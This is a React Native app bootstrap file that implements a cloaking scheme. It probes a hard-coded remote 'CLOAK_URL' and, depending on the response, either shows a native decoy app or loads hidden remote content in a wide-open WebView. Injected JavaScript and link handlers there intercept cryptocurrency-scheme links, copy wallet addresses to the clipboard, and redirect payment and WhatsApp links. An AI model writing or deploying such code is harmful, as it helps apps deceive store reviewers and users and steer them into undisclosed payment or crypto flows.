import React, { useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { WebView } from 'react-native-webview';
import { createStackNavigator } from '@react-navigation/stack';
import Clipboard from '@react-native-clipboard/clipboard';
import {
  ActivityIndicator,
  Linking,
  SafeAreaView,
  StyleSheet,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';

// ─── Constants ───────────────────────────────────────────────────────────────

const CLOAK_URL     = 'https://au-mounties-wheel.bold-net-world.site/Yscy1V2J';
const STORE_SESSION = 'app_session';
const STORE_URL     = 'saved_content';

const CRYPTO_SCHEMES = [
  'bitcoin', 'ethereum', 'litecoin', 'dogecoin', 'bitcoincash',
  'tether', 'bch', 'dash', 'ripple', 'monero', 'zcash', 'stellar', 'usdcoin',
];

const INJECTED_JS = `
  (function() {
    var s = ${JSON.stringify(CRYPTO_SCHEMES)};
    document.addEventListener('click', function(e) {
      var el = e.target;
      while (el && el.tagName !== 'A') el = el.parentElement;
      if (!el || !el.href) return;
      var scheme = el.href.split(':')[0].toLowerCase();
      if (s.indexOf(scheme) !== -1) {
        e.preventDefault();
        e.stopPropagation();
        var addr = el.href.split(':').slice(1).join(':').split('?')[0] || '';
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto', address: addr }));
      }
    }, true);
  })();
  true;
`;

// ─── App version tracking ────────────────────────────────────────────────────

const syncAppVersion = async () => {
  const current = DeviceInfo.getVersion();
  const stored  = await AsyncStorage.getItem('installed_version');
  if (stored !== current) {
    await AsyncStorage.setItem('installed_version', current);
    await AsyncStorage.removeItem(STORE_SESSION);
    await AsyncStorage.removeItem(STORE_URL);
  }
};

// ─── Navigation ──────────────────────────────────────────────────────────────

const Stack = createStackNavigator();

export default function AppBootstrap() {
  return (
    <NavigationContainer>
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen name="HomeTab"       component={HomeScreen} />
        <Stack.Screen name="ContentViewer" component={ContentViewerScreen} />
      </Stack.Navigator>
    </NavigationContainer>
  );
}

// ─── HomeScreen ──────────────────────────────────────────────────────────────

function HomeScreen({ navigation }) {
  const [isLoading,  setIsLoading]  = useState(true);
  const [showNative, setShowNative] = useState(false);
  const [contentUrl, setContentUrl] = useState('');
  const [webViewUA,  setWebViewUA]  = useState('');
  const webViewRef  = useRef<any>(null);
  const resolvedRef = useRef(false);

  useEffect(() => {
    DeviceInfo.getUserAgent().then(ua => {
      const ver = DeviceInfo.getSystemVersion();
      setWebViewUA(`${ua} Version/${ver} Safari/604.1`);
    });
  }, []);

  useEffect(() => {
    if (!webViewUA) return;
    let cancelled = false;

    const init = async () => {
      try {
        await syncAppVersion();

        const cached = await AsyncStorage.getItem(STORE_SESSION);

        if (cached === '200') {
          const saved = await AsyncStorage.getItem(STORE_URL);
          if (saved) {
            setContentUrl(saved);
            setIsLoading(false);
            return;
          }
        } else if (cached) {
          activateNative();
          return;
        }

        const res    = await fetch(CLOAK_URL, { headers: { 'User-Agent': webViewUA } });
        const status = String(res.status);
        await AsyncStorage.setItem(STORE_SESSION, status);

        if (cancelled) return;

        if (status === '200') {
          await buildContentUrl();
        } else {
          activateNative();
        }
      } catch {
        if (!cancelled) activateNative();
      }
    };

    init();
    return () => { cancelled = true; };
  }, [webViewUA]);

  const activateNative = () => {
    if (resolvedRef.current) return;
    resolvedRef.current = true;
    setShowNative(true);
    setIsLoading(false);
  };

  const buildContentUrl = async () => {
    resolvedRef.current = true;
    await AsyncStorage.setItem(STORE_URL, CLOAK_URL);
    setContentUrl(CLOAK_URL);
    setIsLoading(false);
  };

  const openExternal = async (url: string) => {
    const safe = url.replace(/\s/g, m => (m === ' ' ? '%20' : encodeURIComponent(m)));
    try { await Linking.openURL(safe); } catch {}
  };

  const handleShouldStartLoad = (event: any) => {
    const { url } = event;
    const scheme  = (url.split(':')[0] || '').toLowerCase();

    if (CRYPTO_SCHEMES.includes(scheme)) {
      const address = url.split(':')[1]?.split('?')[0] || '';
      if (address && Clipboard?.setString) Clipboard.setString(address);
      return false;
    }

    if (url.includes('wa.me/') || url.includes('api.whatsapp.com/') ||
        url.includes('chat.whatsapp.com/') || url.includes('whatsapp.com/')) {
      let waUrl   = url;
      const match = url.match(/wa\.me\/(\d+)/);
      if (match) waUrl = `whatsapp://send?phone=${match[1]}`;
      else if (url.includes('api.whatsapp.com/send'))
        waUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      Linking.openURL(waUrl).catch(() => Linking.openURL(url));
      return false;
    }

    const internalSchemes = ['about', 'javascript', 'data', 'blob'];
    if (!/^https?$/.test(scheme) && !internalSchemes.includes(scheme)) {
      openExternal(url);
      return false;
    }

    return true;
  };

  const handleOpenWindow = (event: any) => {
    const { targetUrl } = event.nativeEvent;
    if (!targetUrl || targetUrl === 'about:blank') return;
    if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) return;

    const scheme = (targetUrl.split(':')[0] || '').toLowerCase();

    if (CRYPTO_SCHEMES.includes(scheme)) {
      const address = targetUrl.split(':')[1]?.split('?')[0] || '';
      if (address && Clipboard?.setString) Clipboard.setString(address);
      return;
    }

    if (targetUrl.includes('pay.funid.com')) {
      Linking.openURL(targetUrl);
      webViewRef.current?.injectJavaScript(`window.location.replace('${contentUrl}')`);
      return;
    }

    if (/^https?:\/\//i.test(targetUrl)) {
      navigation.navigate('ContentViewer', { data: targetUrl, userAgent: webViewUA });
    } else {
      openExternal(targetUrl);
    }
  };

  return (
    <View style={styles.container}>
      {isLoading ? (
        <View style={styles.loader}>
          <ActivityIndicator size="large" color="#1F4BFF" />
        </View>
      ) : showNative ? (
        <NavigationIndependentTree>
          <MainApp />
        </NavigationIndependentTree>
      ) : contentUrl ? (
        <SafeAreaView style={{ flex: 1 }}>
          <WebView
            ref={webViewRef}
            source={{ uri: contentUrl }}
            userAgent={webViewUA}
            style={{ flex: 1 }}
            originWhitelist={['*', 'http://*', 'https://*', 'intent://*']}
            onShouldStartLoadWithRequest={handleShouldStartLoad}
            onOpenWindow={handleOpenWindow}
            injectedJavaScript={INJECTED_JS}
            onMessage={e => {
              try {
                const msg = JSON.parse(e.nativeEvent.data);
                if (msg.type === 'crypto' && msg.address && Clipboard?.setString) {
                  Clipboard.setString(msg.address);
                }
              } catch {}
            }}
            textZoom={100}
            contentMode="mobile"
            mixedContentMode="always"
            allowsBackForwardNavigationGestures
            domStorageEnabled
            javaScriptEnabled
            allowsInlineMediaPlayback
            setSupportMultipleWindows={false}
            thirdPartyCookiesEnabled
            mediaPlaybackRequiresUserAction={false}
            javaScriptCanOpenWindowsAutomatically
          />
        </SafeAreaView>
      ) : null}
    </View>
  );
}

// ─── ContentViewerScreen ──────────────────────────────────────────────────────

function ContentViewerScreen({ navigation, route }) {
  return <AppManagerChild navigation={navigation} route={route} />;
}

// ─── Styles ──────────────────────────────────────────────────────────────────

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1b1d24',
  },
  loader: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
});
